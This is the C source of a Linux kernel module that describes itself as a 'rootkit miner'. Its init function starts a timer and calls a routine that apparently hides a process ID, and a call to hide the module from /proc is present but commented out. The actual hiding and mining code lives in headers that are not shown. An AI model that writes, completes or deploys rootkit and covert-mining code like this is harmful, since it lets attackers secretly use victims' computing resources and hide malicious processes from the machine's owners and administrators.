#include "hidepid.h"
#include "timer.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Boris Karyshev");
MODULE_AUTHOR("Stepan Glukhov");
MODULE_AUTHOR("Fedor Ipatov");
MODULE_DESCRIPTION("Ha Ha this is rootkit miner");

static int __init hidden_miner_init(void)
{
    hidden_timer_init();
    hidepid_init();
    // hide_module_from_proc();
    return 0;
}

/* Module cleanup */
static void __exit hidden_miner_exit(void)
{
    hidepid_exit();
    hidden_timer_exit();
}

module_init(hidden_miner_init);
module_exit(hidden_miner_exit);
